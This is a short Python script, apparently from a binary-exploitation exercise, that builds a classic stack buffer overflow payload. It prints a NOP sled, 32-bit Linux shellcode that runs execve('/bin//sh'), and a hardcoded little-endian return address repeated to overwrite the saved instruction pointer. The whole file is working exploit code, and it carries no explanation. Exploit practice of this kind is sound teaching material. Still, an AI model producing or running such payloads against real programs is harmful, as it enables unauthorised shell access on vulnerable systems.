import sys
import struct
nop = b'\x90'*67
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
P = b'\x45\x45\x45\x45'*5

addr = 0xbfffef08

#prova
dist = addr+0x40

#
littleE = dist.to_bytes(length = 4, byteorder = "little")
eip = littleE*5

sys.stdout.buffer.write(nop+shellcode+eip)
